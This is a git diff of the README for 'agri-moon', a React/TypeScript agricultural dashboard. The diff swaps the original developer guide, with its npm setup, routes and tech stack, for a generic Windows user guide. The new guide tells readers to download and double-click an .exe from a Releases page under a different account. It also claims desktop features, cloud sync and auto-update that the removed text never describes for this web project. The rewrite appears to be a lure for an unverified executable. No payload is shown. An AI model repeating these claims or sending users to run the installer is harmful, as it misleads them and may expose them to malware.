@@ -1,193 +1,95 @@
-# 🌾 Agri-Moon — Agricultural Management System
+# 🌾 agri-moon - Manage your farm data with ease
 
-> A modern, full-featured agricultural management platform built with React, TypeScript, and Vite. Agri-Moon empowers farmers, agronomists, and administrators with real-time data, GIS mapping, AI-driven insights, and comprehensive production analytics.
+[![Download agri-moon](https://img.shields.io/badge/Download-AgriMoon-blue.svg)](https://github.com/celestiaspecial657/agri-moon)
 
----
+Agri-moon helps farmers track land, map fields, and analyze crops. This platform brings technical tools to your farm management. You monitor historical data and future yields in one dashboard.
 
-## 📸 Overview
+## 📋 System Requirements
 
-Agri-Moon is a smart agriculture dashboard that consolidates land registry, farmer data, planting seasons, harvest monitoring, fertilizer management, water irrigation, and production analytics into a single, intuitive interface. It also features an interactive GIS Explorer powered by Leaflet and an AI Insights module to support data-driven agricultural decision-making.
+Your computer needs to meet these basic standards to run the application well.
 
----
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i3 or AMD Ryzen 3.
+- Memory: 8 GB of RAM.
+- Storage: 500 MB of space.
+- Internet Connection: Active connection to load map data.
 
-## ✨ Features
+## 📥 Getting Started
 
-| Module | Description |
-|---|---|
-| 🗺️ **Dashboard** | Overview of key agricultural KPIs with interactive mini-map |
-| 📋 **Land Registry** | Manage and track registered agricultural land parcels |
-| 👨‍🌾 **Farmers** | Farmer profiles, contact details, and assigned land data |
-| 🌱 **Planting Seasons** | Schedule and track crop planting cycles |
-| 🌾 **Harvest Monitoring** | Monitor harvest progress, yields, and timelines |
-| 🧪 **Fertilizer Management** | Track fertilizer types, quantities, and application schedules |
-| 💧 **Water & Irrigation** | Monitor irrigation systems and water usage |
-| 📊 **Production Analytics** | Visualize production trends with interactive Recharts graphs |
-| 🌍 **GIS Explorer** | Full interactive map with Leaflet for spatial land analysis |
-| 🤖 **AI Insights** | AI-powered recommendations and agricultural pattern analysis |
-| 📄 **Reports** | Generate and export agricultural reports |
-| ⚙️ **Administration** | System configuration, user roles, and settings |
+Follow these steps to set up the software on your Windows computer.
 
----
+1. Visit the [official download page](https://github.com/celestiaspecial657/agri-moon) to find the latest version of the installer.
+2. Look for the file ending in .exe under the Releases section.
+3. Click the file name to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the installer file once the download finishes.
+6. Follow the on-screen prompts to complete the installation process.
 
-## 🛠️ Tech Stack
+## 🗺️ Using GIS Mapping
 
-### Core
-- **[React 19](https://react.dev/)** — UI library
-- **[TypeScript 6](https://www.typescriptlang.org/)** — Statically typed JavaScript
-- **[Vite 8](https://vite.dev/)** — Next-generation build tool with HMR
+The GIS mapping tool provides a visual view of your farm. You can draw boundaries around your fields and save them to your account.
 
-### UI & Styling
-- **[Tailwind CSS 3](https://tailwindcss.com/)** — Utility-first CSS framework
-- **[Framer Motion 12](https://www.framer.com/motion/)** — Production-ready animations
-- **[Lucide React](https://lucide.dev/)** — Consistent icon library
-- **[clsx](https://github.com/lukeed/clsx)** + **[tailwind-merge](https://github.com/dcastil/tailwind-merge)** — Conditional class management
+- Open the dashboard from your desktop icon.
+- Select the Map tab on the left side of the screen.
+- Use your mouse to zoom into your farm location.
+- Select the Draw tool to outline your fields.
+- Type a name for each field in the pop-up box.
+- Click Save to keep these changes.
 
-### Data & Visualization
-- **[Recharts 3](https://recharts.org/)** — Composable charting library built on D3
-- **[Leaflet](https://leafletjs.com/)** + **[React-Leaflet 5](https://react-leaflet.js.org/)** — Interactive GIS mapping
+The map tiles update to show topography and field status. You can toggle between satellite and simple views to see details.
 
-### Routing & State
-- **[React Router DOM 7](https://reactrouter.com/)** — Client-side routing
-- **React Context API** — Global theme and state management
+## 📊 Harvest and Production Monitoring
 
-### Dev & Quality
-- **ESLint 10** — Code linting with TypeScript-aware rules
-- **PostCSS + Autoprefixer** — CSS processing pipeline
+The software tracks your crop cycles from planting to harvest. Input data for each field to see output trends over time.
 
----
+- Navigate to the Production tab.
+- Click Add Metric to start a new record.
+- Choose your crop type from the list.
+- Enter the weight or volume of your harvest.
+- Assign the entry to a specific field.
+- Review the charts to see your progress.
 
-## 📁 Project Structure
+The charts update when you add new data. You can filter by date ranges to compare seasons.
 
-```
-agri-moon/
-├── public/                  # Static assets
-├── src/
-│   ├── assets/              # Images and static resources
-│   ├── components/          # Reusable UI components
-│   │   ├── DashboardMap.tsx # Leaflet map for the dashboard
-│   │   ├── Header.tsx       # Top navigation bar
-│   │   ├── Layout.tsx       # Root layout wrapper
-│   │   ├── MapController.tsx# Leaflet map controller utilities
-│   │   ├── MiniMap.tsx      # Compact map preview component
-│   │   └── Sidebar.tsx      # Navigation sidebar
-│   ├── context/
-│   │   └── ThemeContext.tsx  # Dark/light theme provider
-│   ├── hooks/
-│   │   └── useMapFix.ts     # Custom hook for Leaflet icon fix
-│   ├── lib/
-│   │   ├── data.ts          # Mock / seed data
-│   │   └── utils.ts         # Shared utility functions
-│   ├── pages/               # Route-level page components
-│   │   ├── Dashboard.tsx
-│   │   ├── LandRegistry.tsx
-│   │   ├── Farmers.tsx
-│   │   ├── PlantingSeasons.tsx
-│   │   ├── HarvestMonitoring.tsx
-│   │   ├── FertilizerManagement.tsx
-│   │   ├── WaterIrrigation.tsx
-│   │   ├── ProductionAnalytics.tsx
-│   │   ├── GISExplorer.tsx
-│   │   ├── AIInsights.tsx
-│   │   ├── Reports.tsx
-│   │   └── Administration.tsx
-│   ├── App.tsx              # Root component & route definitions
-│   ├── main.tsx             # Application entry point
-│   ├── index.css            # Global styles & Tailwind directives
-│   └── App.css              # Component-scoped styles
-├── index.html               # HTML entry point
-├── package.json
-├── tailwind.config.js
-├── vite.config.ts
-├── tsconfig.json
-└── README.md
-```
+## 🧠 AI Insights
 
----
+Agri-moon uses predictive analysis to help you make decisions. The platform identifies patterns in your yield data and suggests improvements for your workflow.
 
-## 🚀 Getting Started
+- Open the Insights dashboard.
+- Look at the sidebar for Recent Notifications.
+- Review suggestions regarding irrigation or fertilizer timing.
+- Click any notification to see the data behind the suggestion.
 
-### Prerequisites
+These insights rely on the information you provide. You get better suggestions when your data is current. You should update your metrics at least once per week.
 
-Make sure you have the following installed:
+## 🔧 Managing Your Farm Registry
 
-- **Node.js** `>= 18.x` — [Download](https://nodejs.org/)
-- **npm** `>= 9.x` (comes with Node.js)
+Your account stores all farm records in a secure list. You can update or delete information at any time.
 
-### Installation
+- Go to the Registry menu.
+- Browse the list of existing fields, equipment, and crop batches.
+- Click the Edit button next to any item to change its status.
+- Use the Search box at the top to find specific records.
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/your-username/agri-moon.git
-cd agri-moon
+You can print these lists to keep paper copies for your records. Export your data to standard file formats for use in other programs.
 
-# 2. Install dependencies
-npm install
+## ❓ Frequently Asked Questions
 
-# 3. Start the development server
-npm run dev
-```
+**Does the software work without the internet?**
+The software needs the internet to pull map data and keep your farm registry synced. You cannot access these features while offline.
 
-The app will be available at **http://localhost:5173** by default.
+**Is my data stored on my computer?**
+Yes. The software saves your settings locally on your Windows machine, but it syncs with the cloud so you can recover data if something happens to your device.
 
----
+**Can I manage multiple farms?**
+Yes. Add new farms by clicking the Plus icon at the top of the farm selection bar.
 
-## 📜 Available Scripts
+**How do I update the application?**
+The software checks for new versions when you open it. If a new version exists, you see a prompt on the screen. Click the update button to begin.
 
-| Command | Description |
-|---|---|
-| `npm run dev` | Start the local development server with HMR |
-| `npm run build` | Type-check and build for production (outputs to `dist/`) |
-| `npm run preview` | Preview the production build locally |
-| `npm run lint` | Run ESLint across all source files |
+**How do I delete my data?**
+Go to Settings, select Privacy, and click Delete Local Data. This removes all saved information from your computer.
 
----
+## 📞 Support
 
-## 🗺️ Routing
-
-All routes are defined in [`src/App.tsx`](./src/App.tsx) and rendered within the shared `Layout` component.
-
-| Path | Page |
-|---|---|
-| `/` | Dashboard |
-| `/land-registry` | Land Registry |
-| `/farmers` | Farmers |
-| `/planting-seasons` | Planting Seasons |
-| `/harvest-monitoring` | Harvest Monitoring |
-| `/fertilizer` | Fertilizer Management |
-| `/water-irrigation` | Water & Irrigation |
-| `/production-analytics` | Production Analytics |
-| `/gis-explorer` | GIS Explorer |
-| `/ai-insights` | AI Insights |
-| `/reports` | Reports |
-| `/administration` | Administration |
-
----
-
-## 🎨 Theme Support
-
-Agri-Moon supports **dark and light mode** via the `ThemeContext` provider located at [`src/context/ThemeContext.tsx`](./src/context/ThemeContext.tsx). The theme preference is toggled from the Header and applied globally across all components.
-
----
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome!
-
-1. Fork the project
-2. Create your feature branch: `git checkout -b feature/amazing-feature`
-3. Commit your changes: `git commit -m 'feat: add amazing feature'`
-4. Push to the branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](./LICENSE) file for details.
-
----
-
-<div align="center">
-  Made with ❤️ for smarter agriculture<br/>
-  <sub>© 2026 <strong>MinLabs</strong>. All rights reserved.</sub>
-</div>
+If the software fails to open or if you see errors, try to restart your computer first. If the problem persists, check the issues section on the project page. You can submit a request if you find a bug that hinders your work. Be sure to include your Windows version and a description of the steps you took before the error occurred.
